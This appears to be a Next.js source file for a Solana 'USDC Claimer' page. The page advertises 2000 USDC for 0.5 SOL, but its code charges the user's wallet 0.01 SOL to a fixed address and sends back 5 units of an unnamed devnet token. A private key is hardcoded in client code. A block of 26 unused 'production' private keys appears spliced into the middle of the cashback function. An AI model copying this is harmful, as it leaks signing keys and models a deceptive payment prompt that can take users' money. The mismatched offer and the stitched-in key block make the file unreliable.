/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "44he9Aa8fJDqDSfcd2mJgaiEESzPdDQv1qnXTJiQq5Qav3YP97v2x6q9sqLaAFWa4s3Y8EeFk7a5LNyPZqzyrPGJ"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3iPq1VBMbaUb4C6ywtq6NhB1NhpmSAYS7mxnfmxhtyVRag57gcaL74tXQuBWHPrNSfs7Ko1Srnr3ZS6vMf5NaRmZ",
  "key1": "4DoZqp3NTwcidT5td63K5U31ZAx7QWid7VgJWEi1AH2dRw6zWg8MKd7Q1Z6ULc7snYsu3GjyB4Vz7xtfBpfSPfZ4",
  "key2": "4ev6wVw8ULTkwJzeSuUQsrzZbqqgTr7nSwmWVD4Mfz31KEpUQU4jN3BMJJAHEC3S2idcJXgKu25ypZgWaYi8Mw9H",
  "key3": "4WvHBQq18Hf2HByQSPyz4Q9uqj5v4TjpTujUN3ph73PFeFEkjVkFhdi6FQ5d6v8unbViV48ATKQhwRKWU3XdiP5q",
  "key4": "5aZG1yU82dieBgSZX7whKNWjHQ5bPULQZnwyeTTxXjLQfRv66eXFbb6SR31V3EEwPx38JjGXmkVapz168ef2aQTu",
  "key5": "271o8vDJmPzBvmLruthDYcsDGrFKFJzkwgA9n1vnL1D9JwJCH5rZuWFBnvghZZz3SkTtzZsb61Y644NcQFF3rc8f",
  "key6": "F5eASZ6TVn4EvToTdrk61ThyTmQZ6YqzUMRkoTdwAvjT7JfmkMF1zS1YsZiuf7HBbCFQVxaL32kEHQmKL1KBdnx",
  "key7": "5wkwgYBFm7xo6VpnatZ1jXfkDWWp7NmAo6zEBBMLe2DcKsyWxzehmK4sX8TqnBkB8RzL6TdPgViUy1JW2ucx7Qux",
  "key8": "4RSvF2vv3Rdami99B2uuQdGCcCebY1x54UfnD8YTu5LwBAbyqJb8wMUemJyfcXFmeKxJe2rzmJ6Qc17JTiUXZ5kt",
  "key9": "4uVFTysrUs5Sgn6GjK99XRmb43BubgiEyYKbK2QvDrTrH2pebYTfDBich2CerrjCu7FNSGXXgCFz7gdjP557nfDs",
  "key10": "2diX9mZgjGkgkjccqQuhYnYXKFKD7rgS8USHYqSVe6vddQRuQ8wd5pHvMirUA5U93EYjAXWEYkKxk5R1zhVce9MR",
  "key11": "2vXGF9kiFsmyPj6smRj6fw8aq6E7qTnsEiYsUrDVpatyXEZiCS9BnZGxuJdqfmwLq3Mgs9mq56g3ipVaUp9qwd5X",
  "key12": "5Bi2D1sKqTCJHxU4M6qAZcrgPExcaMdBQcW6C2hNGZUBtnDzmkqtnaFrsnBqADE2JshX5D1aaUbXLf2gnXeVRa5o",
  "key13": "5ADdCtLQVV41Ys8qTXav2Vufs6AXzqjYE6s6h4zW5576FCiuFXrRx1AuQrBT5bAvYNB6dW6J2KkUp3Sie6prFxrg",
  "key14": "2PfZgq5xPnzFomsgkWwDM5yBoaxipPF6pJCGrzNEjXGC6kYqCTSWCuHykYep1JFCdkbqQfbRbFhBWx7c8cnPpYxQ",
  "key15": "37b5vUg3soZwdtyTt9dk88Tz2QSwThp68fp83PNyUPjwzRj2vmyXPPPiQmnMspoBhP75u8MT27QjfrQCSnsJww44",
  "key16": "5DCy1mVGmahT8EygpyHzxzqXNoXjgfKXefNphXLTViVsju5UbDLRHhUeUTpRm18miEqVdTbkff6crUBU7A624Fnr",
  "key17": "4qL9d8Jz66VoCeJazimmCPKZqe5qXFHUENguV6vKgY6vX6RLMeUgXndXJWqWSy882FJBB2LDj89hCA31BrDLtQ6L",
  "key18": "2kfkeDfb1L7EBxMRHbcjmf4Sz2sfrTEpTeL5UwQ7oBwmKa3DhnS6UXJFWAYiSD7SQRiQKfKdZdw42MXdxQ2nMmmb",
  "key19": "57nJYPfJNswRdzDTMePfWVMYQpdCA4p1NfZpNza35NFiCj7ahXhGorc5M2ujXbtzMpACZDbxBoqTLjMDFGWfU4s",
  "key20": "5K4VfqupwaPfHfnYt9w2WNRXo7dBz6GiMmK9RTF5qbP32wQZy5pgRTDeE3spvGvh5Jca67GYTmz2KzfWBSvEFx3b",
  "key21": "2s2mZYMUyuCBw3p8teNTNZAvigs5bYBizVCCYtPsvmMVY74SNiBX6KbDGs6n1oqpG8VRLZn2zp8mpChT6YivwzUW",
  "key22": "WmG3KQhZfrJ3AmNUQn4hczENkk37TzUvTZowZWT7kW29Qbu829yK2yQBcZdVJGq7KEPnYBjLHCws6vwRLcQKFKZ",
  "key23": "cjGxPEGn93D1bJn4hknYDdoHNADz3LqeRmgeubmNAQwMf58PdMJ6frwJft7jJE8LJYT4awL3B2aZNBHUv7aeACp",
  "key24": "5KKxQ8Ti1eRjgNa9fDggrQf3WPcQYnDrBjHtGFkADRH5J9MR6sGq7FtnVavNJ6Qf67uqr8gsFb2GYw3hVvoe4Ngw",
  "key25": "2U9dTTsusB6CRT7ZDk2mXW2biNpxNHry1wA5jpJBkbiacqYqovPk6bZ5LGqz5gmqod2np8VBTPesdQPbzids2kcN"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
